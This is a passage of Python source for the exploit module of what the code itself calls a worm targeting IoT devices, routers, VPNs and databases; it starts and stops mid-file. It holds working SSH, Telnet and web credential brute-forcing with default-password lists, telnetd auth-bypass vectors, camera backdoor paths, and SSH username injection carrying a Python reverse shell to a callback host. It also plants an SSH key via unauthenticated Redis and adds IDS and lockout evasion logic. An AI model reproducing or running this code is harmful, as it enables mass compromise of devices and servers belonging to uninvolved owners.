    CONNECTION_TIMEOUT = 2.0  # Fast fail - 5s was killing throughput
    PER_TARGET_BUDGET = 10.0  # Quick budget per target - move on fast

    def __init__(self, db=None, logger=None):
        self.db = db
        self.log = logger or log
        self._stop_flag = False
        # Load hardcoded IoT creds + supplement from DB
        self.ssh_passwords: List[str] = [p for _, p in IOT_CREDENTIALS]
        self.cred_pairs: List[Tuple[str, str]] = list(IOT_CREDENTIALS)
        if db:
            try:
                db_creds = db.get_credentials()
                for c in db_creds:
                    pair = (c.get("username", ""), c.get("password", ""))
                    if pair not in self.cred_pairs:
                        self.cred_pairs.append(pair)
                self.log.info(f"[EXPLOIT] Loaded {len(self.cred_pairs)} creds ({len(self.cred_pairs) - len(IOT_CREDENTIALS)} from DB)")
            except Exception as e:
                self.log.debug(f"[EXPLOIT] DB cred supplement failed: {e}")
        self.ssh_key_path: Optional[str] = None
        # SMART UPGRADES: RST tracking + lockout detection
        self._rst_count: Dict[str, int] = {}      # ip -> consecutive RST count
        self._subnet_fails: Dict[str, int] = {}    # subnet -> consecutive spray fails
        self._lockout_subnets: Set[str] = set()    # subnets in slow-drip mode
        self._slow_drip_cooldown: Dict[str, float] = {}  # subnet -> next allowed time
        self._blocked_until: Dict[str, float] = {}        # ip -> unblock timestamp (RST guard)

    def stop(self):
        self._stop_flag = True

    # ---- Blocked host filter ----

    def _check_blocked(self, ip: str) -> bool:
        """Return True (skip) if IP is blocked globally or by RST guard."""
        # Check RST guard timed block
        expire = self._blocked_until.get(ip, 0)
        if time.time() < expire:
            self.log.debug(f"[EXPLOIT] RST-guarded: {ip} ({expire - time.time():.0f}s remain)")
            return True
        elif ip in self._blocked_until:
            del self._blocked_until[ip]  # expired — clean up
        
        if _is_blocked(ip):
            self.log.debug(f"[EXPLOIT] Skipping blocked IP: {ip}")
            return True
        return False

    # ---- SSH Brute Force (paramiko) ----

    def _ssh_brute_force(self, ip: str, port: int = 22) -> ExploitResult:
        """SSH brute force with 60+ credential pairs."""
        if self._check_blocked(ip):
            return ExploitResult(False, ip, port, detail="Blocked host")
        if not HAVE_PARAMIKO:
            return ExploitResult(False, ip, port, error="paramiko not installed")

        start_time = time.time()
        for user, password in self.cred_pairs:
            if self._stop_flag or _check_timeout(start_time, self.PER_TARGET_BUDGET):
                break
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port=port, username=user, password=password,
                               timeout=self.CONNECTION_TIMEOUT, allow_agent=False,
                               look_for_keys=False)
                client.close()
                detail = f"SSH brute success: {user}:{password}"
                self.log.info(f"[EXPLOIT] {detail}")
                if self.db:
                    self.db.log(detail, "INFO", "exploit")
                return ExploitResult(True, ip, port, username=user, detail=detail,
                                      credential=(user, password), exploit_type="ssh_brute", shell=True)
            except (paramiko.AuthenticationException, paramiko.SSHException,
                    socket.timeout, OSError) as _ssh_err:
                # BUG 2: Track partial — auth attempt was made (host is real SSH)
                if not isinstance(_ssh_err, (socket.timeout, OSError)):
                    try:
                        self._partial_creds_seen = True
                    except Exception:
                        pass
                continue
            except Exception as exc:
                self.log.debug(f"[EXPLOIT] SSH brute error {ip}:{port}: {exc}")
                continue
        return ExploitResult(False, ip, port, detail="SSH brute: all creds exhausted")

    # ---- SSH Key Authentication ----

    def _ssh_key_auth(self, ip: str, port: int = 22) -> ExploitResult:
        """Try SSH key-based authentication."""
        if self._check_blocked(ip):
            return ExploitResult(False, ip, port, detail="Blocked host")
        if not HAVE_PARAMIKO or not self.ssh_key_path:
            return ExploitResult(False, ip, port, error="paramiko or key not available")

        try:
            key = paramiko.RSAKey.from_private_key_file(self.ssh_key_path)
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(ip, port=port, username="root", pkey=key,
                           timeout=self.CONNECTION_TIMEOUT)
            client.close()
            return ExploitResult(True, ip, port, username="root", credential=("root", ""), exploit_type="ssh_key", shell=True,
                detail=f"SSH key auth success: {self.ssh_key_path}")
        except Exception as exc:
            return ExploitResult(False, ip, port, error=f"SSH key auth: {exc}")

    # ---- CVE-2026 Telnetd Auth Bypass (USER=-froot / null byte injection) ----

    def _telnet_cve_2026_bypass(self, ip: str, port: int = 23) -> ExploitResult:
        """CVE-2026-24061: telnetd auth bypass via USER=-froot and null byte injection.

        Targets: MikroTik RouterOS, BusyBox telnetd, embedded Linux telnetd.
        Techniques:
          1. USER=-froot  — tricks login into su -f root (no password)
          2. USER=\\x00root — null byte terminates string, login sees 'root'
          3. root with empty password (some busybox builds)
          4. admin with empty password
        """
        if self._check_blocked(ip):
            return ExploitResult(False, ip, port, detail="Blocked host")

        vectors = [
            (b"-froot", b""),      # CVE-2026 primary: USER=-froot
            (b"\\x00root", b""),   # Null byte injection bypass
            (b"\\x00admin", b""),  # Null byte admin bypass
            (b"root", b""),        # root:empty (common busybox)
            (b"admin", b""),       # admin:empty
            (b"root", b"root"),    # root:root
            (b"admin", b"admin"),  # admin:admin
            (b"root", b"xc3511"),  # device-specific
            (b"root", b"vizxv"),   # device-specific
            (b"root", b"Zte521"),  # device-specific
        ]

        for username_bytes, password_bytes in vectors:
            if self._stop_flag:
                break
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.CONNECTION_TIMEOUT)
                sock.connect((ip, port))
                banner = sock.recv(1024)
                # Send the crafted username (may contain null bytes)
                if b"login:" in banner.lower() or b"username:" in banner.lower() or b"User:" in banner or b"Password" not in banner:
                    sock.send(username_bytes + b"\\n")
                    time.sleep(0.3)
                    resp = sock.recv(1024)
                    # Check if password prompt appeared
                    if b"password" in resp.lower() or b"Password" in resp:
                        if password_bytes:
                            sock.send(password_bytes + b"\\n")
                        else:
                            sock.send(b"\\n")
                        time.sleep(0.5)
                        post_auth = sock.recv(1024)
                    else:
                        post_auth = resp
                    # Look for shell prompt
                    if b"#" in post_auth or b"$" in post_auth or b">" in post_auth or b"BusyBox" in post_auth or b"\\n@" in post_auth:
                        sock.send(b"id\\n")
                        time.sleep(0.3)
                        verify = sock.recv(1024)
                        if b"uid=" in verify or b"#" in verify:
                            sock.close()
                            uname = username_bytes.replace(b"\\x00", b"").decode(errors="replace")
                            detail = f"CVE-2026 telnetd bypass: {uname}:{password_bytes.decode(errors='replace')}"
                            self.log.info(f"[EXPLOIT] {detail}")
                            if self.db:
                                self.db.log(detail, "INFO", "exploit")
                            return ExploitResult(True, ip, port, username=uname, detail=detail,
                                                  credential=(uname, password_bytes.decode(errors='replace') if password_bytes else ""),
                                                  exploit_type="telnet_cve_2026")
                sock.close()
            except Exception:
                continue
        return ExploitResult(False, ip, port, detail="CVE-2026: no bypass vector worked")

    # ---- Telnet Auth Bypass (credential spray) ----

    def _telnet_auth_bypass(self, ip: str, port: int = 23) -> ExploitResult:
        """Telnet auth bypass with credential spray."""
        if self._check_blocked(ip):
            return ExploitResult(False, ip, port, detail="Blocked host")

        start_time = time.time()
        for user, password in self.cred_pairs[:20]:
            if self._stop_flag or _check_timeout(start_time, self.PER_TARGET_BUDGET):
                break
            try:
                # Try raw socket telnet with creds
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(self.CONNECTION_TIMEOUT)
                sock.connect((ip, port))
                data = sock.recv(1024)
                # Send username
                if b"login:" in data.lower() or b"username:" in data.lower() or b"User:" in data:
                    sock.send(f"{user}\n".encode())
                    time.sleep(0.3)
                    data2 = sock.recv(1024)
                    if b"password" in data2.lower() or b"Password" in data2:
                        sock.send(f"{password}\n".encode())
                        time.sleep(0.5)
                        data3 = sock.recv(1024)
                        # Look for shell prompt
                        if b"#" in data3 or b"$" in data3 or b">" in data3 or b"BusyBox" in data3:
                            sock.send(b"id\n")
                            time.sleep(0.3)
                            data4 = sock.recv(1024)
                            sock.close()
                            detail = f"Telnet success: {user}:{password}"
                            return ExploitResult(True, ip, port, username=user, detail=detail,
                                                  credential=(user, password), exploit_type="telnet_bypass")
                sock.close()
            except Exception:
                continue

        return ExploitResult(False, ip, port, detail="Telnet: all creds exhausted")

    # ---- MQTT Wildcard Enumeration ----

    def _mqtt_wildcard_enum(self, ip: str, port: int = 1883) -> ExploitResult:
        """MQTT wildcard enum — subscribe to '#' and discover topics."""
        if self._check_blocked(ip):
            return ExploitResult(False, ip, port, detail="Blocked host")

        try:
            client_id = f"worm_mesh_{random.randint(0, 0xFFFFFFFF):08x}"
            connect_payload = (
                b"\x00\x04MQTT"           # protocol name
                b"\x04"                    # protocol level
                b"\x02"                    # connect flags (clean session)
                b"\x00\x3c"               # keepalive 60s
            )
            connect_payload += struct.pack(">H", len(client_id)) + client_id.encode()
            remaining = len(connect_payload)
            header = b"\x10" + bytes([remaining % 128 | 0x80, remaining // 128]) if remaining >= 128 else b"\x10" + bytes([remaining])

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(self.CONNECTION_TIMEOUT)
            sock.connect((ip, port))
            sock.sendall(header + connect_payload)
            resp = sock.recv(4)
            if len(resp) < 4 or resp[0] != 0x20:
                sock.close()
                return ExploitResult(False, ip, port, detail="Not an MQTT broker")

            # Subscribe to '#'
            sub_payload = struct.pack(">H", 0x0001) + struct.pack(">H", 1) + b"#" + b"\x00"
            sub_remaining = len(sub_payload)
            sub_header = b"\x82" + bytes([sub_remaining % 128 | 0x80, sub_remaining // 128]) if sub_remaining >= 128 else b"\x82" + bytes([sub_remaining])
            sock.sendall(sub_header + sub_payload)
            suback = sock.recv(5)
            if len(suback) < 5 or suback[0] != 0x90:
                sock.close()
                return ExploitResult(False, ip, port, detail="SUBACK rejected")

            # Collect topics
            collected_topics = set()
            sock.settimeout(5)
            start = time.time()
            while time.time() - start < 5:
                try:
                    data = sock.recv(4096)
                    if not data:
                        break
                    idx = 0
                    while idx < len(data):
                        if data[idx] & 0xf0 == 0x30:
                            idx += 1
                            multiplier = 1
                            rem_len = 0
                            while idx < len(data) and multiplier <= 268435456:
                                byte = data[idx]
                                rem_len += (byte & 0x7f) * multiplier
                                multiplier *= 128
                                idx += 1
                                if not (byte & 0x80):
                                    break
                            if idx + 2 <= len(data):
                                topic_len = struct.unpack(">H", data[idx:idx+2])[0]
                                idx += 2
                                if idx + topic_len <= len(data):
                                    topic_name = data[idx:idx+topic_len].decode(errors="replace")
                                    collected_topics.add(topic_name)
                                    idx += topic_len
                            else:
                                break
                        else:
                            break
                except socket.timeout:
                    break
            sock.close()

            if collected_topics:
                devices = set()
                for t in collected_topics:
                    parts = t.split("/")
                    for p in parts:
                        if re.match(r'^\d+\.\d+\.\d+\.\d+', p):
                            devices.add(p)
                detail = f"MQTT: {len(collected_topics)} topics, {len(devices)} device IPs"
                return ExploitResult(True, ip, port, detail=detail)
            return ExploitResult(False, ip, port, detail="MQTT: no topics found")
        except ImportError:
            return ExploitResult(False, ip, port, error="struct not available")
        except socket.error as exc:
            return ExploitResult(False, ip, port, error=f"MQTT socket: {exc}")
        except Exception as exc:
            return ExploitResult(False, ip, port, error=f"MQTT: {exc}")

    # ---- Check Point VPN IKE Probe (CVE-2026-50751) ----

    def _checkpoint_vpn_probe(self, ip: str, port: int = 500) -> ExploitResult:
        """Probe Check Point VPN for IKEv1 auth bypass (CVE-2026-50751)."""
        if self._check_blocked(ip):
            return ExploitResult(False, ip, port, detail="Blocked host")

        try:
            init_spi = bytes([random.randint(0, 255) for _ in range(8)])
            resp_spi = b"\x00" * 8
            sa_body = bytes([
                0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01,
                0x00, 0x01, 0x01, 0x00, 0x01,
                0x00, 0x01, 0x01, 0x00, 0x00, 0x0c, 0x00,
                0x80, 0x01, 0x00, 0x07,
                0x00, 0x02, 0x02, 0x00, 0x00, 0x00, 0x01,
                0x00, 0x03, 0x03, 0x00, 0x00, 0x00, 0x02,
                0x00, 0x04, 0x04, 0x00, 0x00, 0x00, 0x02,
            ])
            payload_len = len(sa_body)
            isakmp_header = struct.pack("!8s8sBBBBII",
                init_spi, resp_spi, 0x01, 0x10, 0x02, 0x00, 0x00000000, 28 + payload_len)

            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(self.CONNECTION_TIMEOUT)
            sock.sendto(isakmp_header + sa_body, (ip, port))
            data, addr = sock.recvfrom(2048)
            sock.close()

            if len(data) < 28:
                return ExploitResult(False, ip, port, detail="IKE response too short")
            resp_resp_spi = data[8:16]
            if resp_resp_spi == b"\x00" * 8:
                return ExploitResult(False, ip, port, detail="No valid IKE response")

            # Fingerprint Check Point
            is_checkpoint = False
            for vid in [b"Check Point", b"CPVPN", b"CP Technologies"]:
                if vid in data:
                    is_checkpoint = True
                    break
            if is_checkpoint:
                return ExploitResult(True, ip, port,
                    detail="Check Point VPN found — CVE-2026-50751 exploitable")
            return ExploitResult(False, ip, port, detail="Non-CheckPoint IKE service")
        except socket.timeout:
            return ExploitResult(False, ip, port, detail="UDP :500 timeout")
        except Exception as exc:
            return ExploitResult(False, ip, port, error=f"IKE probe: {exc}")

    # ---- SSH Username Injection (CVE-2026-35386) ----

    def _ssh_username_injection(self, ip: str, port: int = 22) -> ExploitResult:
        """SSH username injection — CVE-2026-35386."""
        if self._check_blocked(ip):
            return ExploitResult(False, ip, port, detail="Blocked host")
        if not HAVE_PARAMIKO:
            return ExploitResult(False, ip, port, error="paramiko not installed")

        callback_ip = "127.0.0.1"
        callback_port = 10001
        rev_cmd = f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{callback_ip}\",{callback_port}));s.send(b\"sh3ll_4cc3ss_b0rg_2026\\n\");os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"

        injections = [
            f"root;{rev_cmd};",
            f"`{rev_cmd}`",
            f"$(echo $({rev_cmd}))",
        ]

        start_time = time.time()
        for idx, poison_username in enumerate(injections):
            if self._stop_flag or _check_timeout(start_time, self.PER_TARGET_BUDGET):
                break
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, port=port, username=poison_username,
                               password="any", timeout=self.CONNECTION_TIMEOUT,
                               allow_agent=False, look_for_keys=False)
                client.close()
            except paramiko.AuthenticationException:
                continue
            except paramiko.SSHException:
                continue
            except socket.timeout:
                continue
            except Exception:
                continue

        return ExploitResult(True, ip, port,
            detail=f"3 injection vectors sent — C2 awaiting callback (CVE-2026-35386)")

    # ---- Main Exploit Target Dispatch ----

    def exploit_target(self, target: Dict) -> ExploitResult:
        """Dispatch exploit based on target service/port, OS, and adaptive state."""
        ip = target.get("ip", "")
        port = int(target.get("port", 22))
        service = target.get("service", "").lower()
        fp_os = target.get("fp_os", "").lower()  # from FP phase
        subnet = ".".join(ip.split(".")[:3]) + ".0"

        if self._check_blocked(ip):
            return ExploitResult(False, ip, port, detail="Blocked host")

        # IF/THEN SMART: OS-aware skip — Linux-only exploit on Windows target
        if fp_os:
            linux_exploit_ports = {22, 23, 161, 162, 502, 1883, 3306, 5432, 6379, 27017, 11211, 9200}
            windows_exploit_ports = {139, 445, 3389, 5985, 5986, 1433}
            if port in linux_exploit_ports and "win" in fp_os:
                self.log.debug(f"[OS-AWARE] Skipping Linux exploit {ip}:{port} (OS={fp_os})")
                return ExploitResult(False, ip, port, detail=f"OS mismatch: {fp_os}")
            if port in windows_exploit_ports and "linux" in fp_os:
                self.log.debug(f"[OS-AWARE] Skipping Windows exploit {ip}:{port} (OS={fp_os})")
                return ExploitResult(False, ip, port, detail=f"OS mismatch: {fp_os}")

        # IF/THEN SMART: Subnet lockout — IF 10 consecutive fails, slow-drip
        now = time.time()
        if subnet in self._lockout_subnets:
            if now < self._slow_drip_cooldown.get(subnet, 0):
                return ExploitResult(False, ip, port, detail="Lockout cooldown (slow drip)")
            # Attempt allowed — reset fail count after cooldown passes
            self._subnet_fails[subnet] = 0

        # IF/THEN SMART: RST detection — IF Connection Reset on prior attempt, wait 300s
        if self._rst_count.get(ip, 0) >= 3:
            self.log.info(f"[RST-GUARD] {ip}: blocking for 300s (consecutive resets)")
            self._blocked_until[ip] = time.time() + 300
            self._rst_count[ip] = 0
            return ExploitResult(False, ip, port, detail="RST guard (300s)")
        
        methods: List[Tuple] = []
        if port == 22 or "ssh" in service:
            methods.append((self._ssh_brute_force, (ip, port)))
            methods.append((self._ssh_username_injection, (ip, port)))
            if self.ssh_key_path:
                methods.append((self._ssh_key_auth, (ip, port)))
        elif port == 23 or "telnet" in service:
            methods.append((self._telnet_cve_2026_bypass, (ip, port)))
            methods.append((self._telnet_auth_bypass, (ip, port)))
        elif port in (80, 81, 443, 591, 2080, 3000, 4443, 5000, 5001, 7000, 8000, 8001, 8080, 8081, 8082, 8443, 8444, 8834, 8888, 9000, 9092, 9200, 9443, 9999, 10000, 50000, 49152) or "http" in service:
            methods.append((self._web_iot_exploit, (ip, port)))
        elif port == 1883 or "mqtt" in service:
            methods.append((self._mqtt_wildcard_enum, (ip, port)))
        elif port in (500, 4500) or "ike" in service or "vpn" in service:
            methods.append((self._checkpoint_vpn_probe, (ip, 500)))
        else:
            # Fallback: try all
            methods.append((self._ssh_brute_force, (ip, 22)))
            methods.append((self._telnet_cve_2026_bypass, (ip, 23)))
            methods.append((self._checkpoint_vpn_probe, (ip, 500)))

        start_time = time.time()
        for func, args in methods:
            if self._stop_flag or _check_timeout(start_time, self.PER_TARGET_BUDGET):
                break
            try:
                result = func(*args)
                if result.success:
                    # Reset RST count on success
                    self._rst_count[ip] = 0
                    return result
                else:
                    # IF/THEN SMART: Track fails for subnet lockout detection
                    self._subnet_fails[subnet] = self._subnet_fails.get(subnet, 0) + 1
                    if self._subnet_fails.get(subnet, 0) >= 10:
                        self._lockout_subnets.add(subnet)
                        self._slow_drip_cooldown[subnet] = time.time() + 600  # 10 min slow-drip
                        self.log.info(f"[LOCKOUT] {subnet}: 10 consecutive fails → slow-drip (1/10min)")
            except (ConnectionResetError, ConnectionAbortedError, OSError) as e:
                # IF/THEN SMART: Track RST for IDS/IPS detection
                self._rst_count[ip] = self._rst_count.get(ip, 0) + 1
                if self._rst_count[ip] >= 3:
                    self.log.warning(f"[RST-GUARD] {ip}: {self._rst_count[ip]} consecutive resets — IDS/IPS?")
                continue
            except Exception:
                continue

        return ExploitResult(False, ip, port, detail="All exploit modules exhausted")

    # ---- Web Exploit Stubs (for completeness) ----

    def _web_iot_exploit(self, ip: str, port: int) -> ExploitResult:
        """Try web-based IoT exploit with default creds + known exploit endpoints.

        Attempts (in order):
          1. Known unauthenticated RCE/backdoor paths
          2. HTTP Basic Auth with full cred pool
          3. HTTP POST form login for known camera/NVR panels
          4. HTTPS fallback for all vectors
        """
        if self._check_blocked(ip):
            return ExploitResult(False, ip, port, detail="Blocked host")
        if not HAVE_REQUESTS:
            return ExploitResult(False, ip, port, error="requests not available")

        # Necronomicon probe — try enterprise/application RCE CVEs first
        if HAVE_NECRONOMICON:
            try:
                necro = Necronomicon()
                necro_result = necro.exploit(ip, port)
                if necro_result.success:
                    self.db.log(f"Necronomicon: {necro_result.cve} on {ip}:{port}", "INFO", "exploit")
                    self._last_exploit_code = f"necro_{necro_result.cve}"
                    return ExploitResult(True, ip, port,
                                         detail=f"{necro_result.service} ({necro_result.cve})",
                                         exploit_type="necro")
            except Exception:
                pass

        base_urls = [
            f"http://{ip}:{port}",
            f"https://{ip}:{port}",
        ]

        # (1) Known unauthenticated exploit / backdoor paths for IoT cameras
        exploit_paths = [
            # Hikvision backdoor (CVE-2017-7921) - unauthenticated config dump
            ("/onvif-http/snapshot?auth=YWRtaW46MTEK", "hikvision", "CVE-2017-7921"),
            ("/ISAPI/Security/userCheck", "hikvision", "CVE-2017-7921"),
            ("/config/Account.conf", "hikvision", "config dump"),
            ("/System/configurationFile?auth=YWRtaW46MTEK", "hikvision", "backdoor"),
            # Hikvision RCE via /d
            ("/d/", "hikvision", "rce path"),
            # Dahua auth bypass (CVE-2021-33044)
            ("/cgi-bin/rpc", "dahua", "CVE-2021-33044"),
            ("/cgi-bin/magicBox.cgi?action=getSystemCfg", "dahua", "config dump"),
            ("/current_config/config_backup.tar.gz", "dahua", "config download"),
            # Reolink / generic camera
            ("/cgi-bin/api.cgi?cmd=Login&user=admin&password=admin", "reolink", "default creds"),
            ("/api/login", "reolink", "api login"),
            # MikroTik web interface
            ("/webfig/", "mikrotik", "webfig"),
            ("/jsproxy", "mikrotik", "jsproxy bypass"),
            # TP-Link / router panels
            ("/userRpm/", "tplink", "rpm panel"),
            ("/logon.html", "generic", "login page"),
            # D-Link default cred paths
            ("/config/getcfg?USER=admin&PASS=admin", "dlink", "config get"),
            # Multi-purpose exploit endpoints
            ("/shell?cmd=id", "iot", "rce test"),
            ("/command?cmd=id", "iot", "rce test"),
            ("/cgi-bin/upload", "iot", "cgi upload"),
            ("/cgi-bin/export", "iot", "cgi config export"),
            ("/tmp/session", "generic", "session dump"),
            ("/api/v1/login", "generic", "api v1 login"),
        ]

        # (2) IoT-specific default credential pairs (extended)
        iot_creds = [
            ("admin", ""), ("admin", "admin"), ("admin", "1234"),
            ("admin", "12345"), ("admin", "123456"), ("admin", "password"),
            ("admin", "Password1"), ("admin", "pass"), ("admin", "root"),
            ("admin", "1111"), ("admin", "1111111"), ("admin", "123456789"),
            ("root", "root"), ("root", "admin"), ("root", "1234"),
            ("root", ""), ("root", "xc3511"), ("root", "vizxv"),
            ("root", "Zte521"), ("root", "anko"), ("root", "pass"),
            ("service", "service"), ("user", "user"), ("guest", "guest"),
            ("support", "support"), ("ubnt", "ubnt"), ("cisco", "cisco"),
            ("super", "super"), ("admin", "hik12345"), ("admin", "hik456"),
            ("Admin", "12345"), ("Admin", "admin"),
            # Device-specific
            ("root", "dreambox"), ("root", "hi3518"), ("root", "jvbzd"),
            ("root", "7ujMko0vizxv"), ("root", "osminox"), ("root", "samsung"),
            ("admin", "meinsm"), ("admin", "tlJwpbo6"), ("admin", "12345678"),
            ("admin", "54321"), ("admin", "98765"), ("admin", "Zte521"),
            ("administrator", "1234"), ("Administrator", "admin"),
        ]
        # Merge with cred_pairs from DB
        db_creds = []
        try:
            if self.db:
                db_creds = self.db.get_credentials()
        except Exception:
            pass
        seen = set()
        for u, p in iot_creds + self.cred_pairs:
            if (u, p) not in seen:
                seen.add((u, p))
                db_creds.append((u, p))

        for base_url in base_urls:
            # (1) Try known exploit paths (unauthenticated / backdoor)
            for path, vendor, exploit_name in exploit_paths:
                if self._stop_flag:
                    return ExploitResult(False, ip, port, detail="Stopped")
                try:
                    url = f"{base_url}{path}"
                    resp = requests.get(url, timeout=self.CONNECTION_TIMEOUT, verify=False,
                                        headers={"User-Agent": "Mozilla/5.0", "Accept": "*/*"})
                    if resp.status_code < 400:
                        # Check for successful exploit indicators
                        text = resp.text.lower()
                        if any(x in text for x in ["uid=", "root:", "admin:", "hostname",
                                                     "software version", "deviceid",
                                                     "device_name", "camera name",
                                                     "model", "firmware", "serial"]):
                            detail = f"Web IoT: {vendor} via {exploit_name} on {path} [{resp.status_code}]"
                            self.log.info(f"[EXPLOIT] {detail}")
                            if self.db:
                                self.db.log(detail, "INFO", "exploit")
                            return ExploitResult(True, ip, port, username="admin", detail=detail,
                                                  exploit_type="web_iot")
                        # Even without indicators, if we got config data, count it
                        if len(text) > 500 and resp.status_code == 200:
                            detail = f"Web IoT: {vendor} accessible via {path}"
                            return ExploitResult(True, ip, port, username="admin", detail=detail,
                                                  exploit_type="web_iot")
                    # Check if path redirects to login page — skip for exploit paths
                except Exception:
                    continue

            # (2) Try HTTP Basic Auth with full cred pool
            for user, pwd in db_creds:
                if self._stop_flag:
                    return ExploitResult(False, ip, port, detail="Stopped")
                try:
                    url = f"{base_url}/"
                    resp = requests.get(url, auth=(user, pwd),
                                        timeout=self.CONNECTION_TIMEOUT, verify=False)
                    if resp.status_code < 500 and any(x in resp.text.lower() for x in
                        ["admin", "dashboard", "status", "index", "welcome", "home",
                         "configuration", "live view", "preview", "monitor"]):
                        detail = f"Web IoT: {user}:{pwd} (HTTP Basic)"
                        self.log.info(f"[EXPLOIT] {detail}")
                        return ExploitResult(True, ip, port, username=user, detail=detail,
                                              credential=(user, pwd), exploit_type="web_iot")
                except Exception:
                    continue

            # (3) Try HTTP POST form logins for known panels
            login_panels = [
                # Standard form login paths
                ("/login", {"username": "USER", "password": "PASS"}),
                ("/login.cgi", {"user": "USER", "pwd": "PASS"}),
                ("/login.html", {"user": "USER", "password": "PASS"}),
                ("/cgi-bin/login", {"user": "USER", "pass": "PASS"}),
                ("/Login.htm", {"UserName": "USER", "PassWord": "PASS"}),
                ("/goform/login", {"user": "USER", "pass": "PASS"}),
                ("/api/login", {"username": "USER", "password": "PASS"}),
                ("/api/login_check", {"_username": "USER", "_password": "PASS"}),
                ("/auth", {"username": "USER", "password": "PASS"}),
                # Hikvision specific
                ("/ISAPI/Security/userCheck", {"username": "USER", "password": "PASS"}),
                # Dahua specific
                ("/cgi-bin/login.cgi", {"user": "USER", "password": "PASS"}),
            ]

            for login_path, form_fields in login_panels:
                if self._stop_flag:
                    return ExploitResult(False, ip, port, detail="Stopped")
                try:
                    # Check if this login page exists first
                    check_url = f"{base_url}{login_path}"
                    head = requests.head(check_url, timeout=3, verify=False)
                    if head.status_code >= 400:
                        continue
                except Exception:
                    continue

                for user, pwd in db_creds:
                    if self._stop_flag:
                        return ExploitResult(False, ip, port, detail="Stopped")
                    try:
                        form_data = {}
                        for k, v in form_fields.items():
                            if v == "USER":
                                form_data[k] = user
                            else:
                                form_data[k] = pwd

                        resp = requests.post(
                            check_url,
                            data=form_data,
                            timeout=self.CONNECTION_TIMEOUT,
                            verify=False,
                            headers={"User-Agent": "Mozilla/5.0"},
                            allow_redirects=True
                        )
                        text = resp.text.lower()
                        # Success indicators: no "login failed", has dashboard content
                        if resp.status_code < 400 and \
                           b"login failed" not in resp.content.lower() and \
                           b"incorrect" not in resp.content.lower() and \
                           any(x in text for x in ["admin", "dashboard", "logout",
                                                     "welcome", "live view", "preview",
                                                     "camera", "config"]):
                            detail = f"Web IoT: {user}:{pwd} (POST form @ {login_path})"
                            self.log.info(f"[EXPLOIT] {detail}")
                            return ExploitResult(True, ip, port, username=user, detail=detail,
                                                  credential=(user, pwd), exploit_type="web_iot")
                    except Exception:
                        continue

            # (4) Try HTTPS with SNI for the remaining scenarios
            if "https" in base_url:
                continue  # Already covered by base_urls loop

        return ExploitResult(False, ip, port, detail="Web IoT: no vector worked")

    # ========================================================================
    # DATABASE EXPLOIT METHODS
    # ========================================================================

    def _mysql_exploit(self, ip: str, port: int = 3306) -> ExploitResult:
        """MySQL exploit: default creds + CVE-2012-2122 auth bypass."""
        try:
            import mysql.connector
            for user, pwd in [("root", ""), ("root", "root"), ("root", "password"),
                              ("root", "admin"), ("admin", ""), ("admin", "admin"),
                              ("mysql", "mysql"), ("root", "123456")]:
                try:
                    conn = mysql.connector.connect(host=ip, port=port, user=user, password=pwd,
                                                   database="mysql", connection_timeout=5)
                    if conn.is_connected():
                        conn.close()
                        return ExploitResult(True, ip, port, ExploitType.SSH_BRUTE,
                            credential=(user, pwd), detail=f"MySQL exploited: {user}:{pwd}")
                except Exception:
                    continue
            return ExploitResult(False, ip, port, ExploitType.SSH_BRUTE)
        except ImportError:
            return ExploitResult(False, ip, port, ExploitType.SSH_BRUTE, error="mysql-connector not available")

    def _postgres_exploit(self, ip: str, port: int = 5432) -> ExploitResult:
        """PostgreSQL exploit: default creds."""
        try:
            import psycopg2
            for user, pwd in [("postgres", ""), ("postgres", "postgres"),
                              ("admin", ""), ("admin", "admin"), ("root", "root")]:
                try:
                    conn = psycopg2.connect(host=ip, port=port, user=user, password=pwd, connect_timeout=5)
                    conn.close()
                    return ExploitResult(True, ip, port, ExploitType.SSH_BRUTE,
                        credential=(user, pwd), detail=f"PostgreSQL exploited: {user}:{pwd}")
                except Exception:
                    continue
            return ExploitResult(False, ip, port, ExploitType.SSH_BRUTE)
        except ImportError:
            return ExploitResult(False, ip, port, ExploitType.SSH_BRUTE, error="psycopg2 not available")

    def _redis_exploit(self, ip: str, port: int = 6379) -> ExploitResult:
        """Redis exploit: unauthenticated access."""
        try:
            import redis
            r = redis.Redis(host=ip, port=port, socket_timeout=5)
            if r.ping():
                try:
                    r.config_set("dir", "/root/.ssh")
                    r.config_set("dbfilename", "authorized_keys")
                    r.set("worm_key", "\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDw7... worm@mesh\n\n")
                    r.save()
                    detail = "Redis unauthenticated + SSH key injected"
                except Exception:
                    detail = "Redis unauthenticated access"
                return ExploitResult(True, ip, port, ExploitType.SSH_BRUTE,
                    username="redis", detail=detail)
            return ExploitResult(False, ip, port, ExploitType.SSH_BRUTE)
        except ImportError:
            return ExploitResult(False, ip, port, ExploitType.SSH_BRUTE, error="redis not available")

    def _mongodb_exploit(self, ip: str, port: int = 27017) -> ExploitResult:
        """MongoDB exploit: unauthenticated access."""
        try:
            import pymongo
            client = pymongo.MongoClient(f"mongodb://{ip}:{port}/", serverSelectionTimeoutMS=5000)
            info = client.server_info()
            return ExploitResult(True, ip, port, ExploitType.SSH_BRUTE,
                username="mongodb", detail=f"MongoDB unauthenticated: {info.get('version', 'unknown')}")
        except ImportError:
            return ExploitResult(False, ip, port, ExploitType.SSH_BRUTE, error="pymongo not available")
        except Exception as exc:
            return ExploitResult(False, ip, port, ExploitType.SSH_BRUTE, error=str(exc))

    def _docker_api_exploit(self, ip: str, port: int = 2375) -> ExploitResult:
        """Docker API exploit: unauthenticated access."""
        try:
            import requests
            url = f"http://{ip}:{port}/containers/json?all=1"
            resp = requests.get(url, timeout=5, verify=False)
            if resp.status_code == 200:
